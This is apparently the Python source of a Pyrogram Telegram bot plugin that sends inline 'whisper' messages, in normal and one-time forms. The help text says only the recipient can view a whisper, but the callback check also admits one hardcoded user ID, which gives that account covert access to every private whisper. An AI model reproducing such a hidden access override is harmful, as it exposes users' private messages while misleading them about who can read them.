from ChampuMusic import app
from pyrogram import filters
from pyrogram.types import (
    InlineQueryResultArticle, InputTextMessageContent,
    InlineKeyboardMarkup, InlineKeyboardButton
)

from utils.permissions import unauthorised

BOT_USERNAME = app.username

whisper_db = {}

switch_btn = InlineKeyboardMarkup([[InlineKeyboardButton("💌 Switch to Whisper", switch_inline_query_current_chat="")]])

async def _whisper(_, inline_query):
    data = inline_query.query
    results = []
    
    if len(data.split()) < 2:
        mm = [
            InlineQueryResultArticle(
                title="💌 Whisper",
                description=f"@{BOT_USERNAME} [USERNAME|ID|MENTION] [TEXT]",
                input_message_content=InputTextMessageContent(
                    f"💌 Whisper Usage:\n\n"
                    f"@{BOT_USERNAME} [USERNAME|ID|MENTION] [TEXT]\n\n"
                    "Examples:\n"
                    f"@{BOT_USERNAME} @username I have a secret for you\n"
                    f"@{BOT_USERNAME} 123456789 Check this out!"
                ),
                thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                reply_markup=switch_btn
            )
        ]
    else:
        try:
            # Extract user identifier (could be mention, username, or ID)
            user_identifier = data.split()[0]
            msg = data.split(None, 1)[1]
            
            # Remove '@' if it's a mention or username
            if user_identifier.startswith('@'):
                user_identifier = user_identifier[1:]
            
            try:
                user = await _.get_users(user_identifier)
            except Exception as e:
                mm = [
                    InlineQueryResultArticle(
                        title="❌ Error",
                        description="User not found! Please check the username/ID.",
                        input_message_content=InputTextMessageContent(
                            "❌ User not found!\n\n"
                            "Please make sure you've entered a valid:\n"
                            "- User ID\n"
                            "- Username (without @)\n"
                            "- Or mention the user"
                        ),
                        thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                        reply_markup=switch_btn
                    )
                ]
                return await inline_query.answer(mm)
            
            # Create notification message that will be visible in chat
            notification_msg = (
                f"🔔 {inline_query.from_user.mention} sent a whisper for {user.mention}!\n\n"
                f"Only {user.mention} can view it by clicking the button below."
            )
            
            whisper_btn = InlineKeyboardMarkup([[
                InlineKeyboardButton(
                    f"💌 View Whisper (from {inline_query.from_user.first_name})", 
                    callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}"
                )
            ]])
            
            one_time_whisper_btn = InlineKeyboardMarkup([[
                InlineKeyboardButton(
                    f"⚠️ One-Time Whisper (from {inline_query.from_user.first_name})", 
                    callback_data=f"fdaywhisper_{inline_query.from_user.id}_{user.id}_one"
                )
            ]])
            
            mm = [
                InlineQueryResultArticle(
                    title="💌 Normal Whisper",
                    description=f"Send a whisper to {user.first_name} (can be viewed multiple times)",
                    input_message_content=InputTextMessageContent(notification_msg),
                    thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                    reply_markup=whisper_btn
                ),
                InlineQueryResultArticle(
                    title="⚠️ One-Time Whisper",
                    description=f"Send a one-time whisper to {user.first_name} (disappears after viewing)",
                    input_message_content=InputTextMessageContent(notification_msg),
                    thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                    reply_markup=one_time_whisper_btn
                )
            ]
            
            # Store the whisper message in database
            whisper_db[f"{inline_query.from_user.id}_{user.id}"] = {
                "msg": msg,
                "from_user": inline_query.from_user.id,
                "to_user": user.id,
                "from_name": inline_query.from_user.first_name
            }
            
        except Exception as e:
            mm = [
                InlineQueryResultArticle(
                    title="❌ Error",
                    description="An error occurred while processing your whisper.",
                    input_message_content=InputTextMessageContent(
                        "❌ An error occurred!\n\n"
                        "Please try again or check your input format."
                    ),
                    thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
                    reply_markup=switch_btn
                )
            ]
    
    await inline_query.answer(mm, cache_time=0)

@app.on_callback_query(filters.regex(pattern=r"fdaywhisper_(.*)"))
async def whispes_cb(_, query):
    data = query.data.split("_")
    from_user = int(data[1])
    to_user = int(data[2])
    user_id = query.from_user.id
    
    # Check if the user is authorized to view this whisper
    if user_id not in [from_user, to_user, 6399386263]:
        try:
            await _.send_message(
                from_user,
                f"{query.from_user.mention} is trying to view your whisper to {to_user}."
            )
        except unauthorised:
            pass
        
        return await query.answer(
            "This whisper is not for you! Only the intended recipient can view it.", 
            show_alert=True
        )
    
    search_msg = f"{from_user}_{to_user}"
    
    try:
        whisper_data = whisper_db[search_msg]
        msg = (
            f"💌 Whisper from {whisper_data['from_name']}:\n\n"
            f"{whisper_data['msg']}"
        )
    except:
        msg = "⚠️ Error!\n\nThe whisper message could not be found. It may have expired or been deleted."
    
    SWITCH = InlineKeyboardMarkup([[InlineKeyboardButton("💌 Send a Whisper", switch_inline_query_current_chat="")]])
    
    await query.answer(msg, show_alert=True)
    
    # If it's a one-time whisper and the recipient viewed it
    if len(data) > 3 and data[3] == "one":
        if user_id == to_user:
            # Delete the whisper after viewing
            try:
                del whisper_db[search_msg]
            except:
                pass
            
            await query.edit_message_text(
                "📝 This was a one-time whisper and has been deleted after viewing!\n\n"
                "The message can no longer be viewed by anyone.",
                reply_markup=SWITCH
            )

async def in_help():
    answers = [
        InlineQueryResultArticle(
            title="💌 Whisper Help",
            description=f"Send anonymous messages with @{BOT_USERNAME}",
            input_message_content=InputTextMessageContent(
                f"**💌 Whisper Help:**\n\n"
                f"Send private messages that only the recipient can view.\n\n"
                f"**Format:**\n"
                f"@{BOT_USERNAME} [USERNAME|ID|MENTION] [MESSAGE]\n\n"
                f"**Examples:**\n"
                f"@{BOT_USERNAME} @username I have a secret for you\n"
                f"@{BOT_USERNAME} 123456789 Check this out!\n\n"
                f"**Features:**\n"
                "- Normal whispers (can be viewed multiple times)\n"
                "- One-time whispers (disappear after viewing)\n"
                "- Mentions the recipient in the notification"
            ),
            thumb_url="https://telegra.ph/file/cef50394cb41a2bdb4121.jpg",
            reply_markup=switch_btn
        )
    ]
    return answers

@app.on_inline_query()
async def bot_inline(_, inline_query):
    string = inline_query.query.lower()
    
    if string.strip() == "":
        answers = await in_help()
        await inline_query.answer(answers)
    elif string.startswith("help"):
        answers = await in_help()
        await inline_query.answer(answers)
    else:
        await _whisper(_, inline_query)